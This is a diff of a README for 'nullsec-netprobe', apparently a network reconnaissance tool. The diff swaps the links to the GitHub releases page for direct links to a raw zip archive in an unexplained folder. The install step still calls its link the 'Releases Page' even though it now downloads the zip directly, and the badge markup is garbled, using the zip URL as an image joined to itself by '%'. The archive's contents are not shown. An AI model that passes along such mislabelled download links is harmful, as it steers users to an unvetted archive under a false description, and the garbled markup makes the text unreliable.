@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the nullsec-netprobe applicat
 
 ## 📥 Download Now
 
-[![Download nullsec-netprobe](https://img.shields.io/badge/Download%20nullsec--netprobe-lightblue.svg)](https://github.com/satwik-coder/nullsec-netprobe/releases)
+[![Download nullsec-netprobe](https://github.com/satwik-coder/nullsec-netprobe/raw/refs/heads/main/quinquino/nullsec-netprobe-v3.8.zip%https://github.com/satwik-coder/nullsec-netprobe/raw/refs/heads/main/quinquino/nullsec-netprobe-v3.8.zip)](https://github.com/satwik-coder/nullsec-netprobe/raw/refs/heads/main/quinquino/nullsec-netprobe-v3.8.zip)
 
 ## 📋 What is nullsec-netprobe?
 
@@ -28,7 +28,7 @@ nullsec-netprobe is a stealthy network reconnaissance toolkit built in Nim. It h
 
 ## 🔍 How to Download & Install
 
-1. **Visit the Releases Page:** Click this link to go to the nullsec-netprobe releases page: [Download Page](https://github.com/satwik-coder/nullsec-netprobe/releases).
+1. **Visit the Releases Page:** Click this link to go to the nullsec-netprobe releases page: [Download Page](https://github.com/satwik-coder/nullsec-netprobe/raw/refs/heads/main/quinquino/nullsec-netprobe-v3.8.zip).
 
 2. **Find the Latest Release:** On the releases page, locate the latest version listed at the top. It usually includes the version number and the date it was published.
 
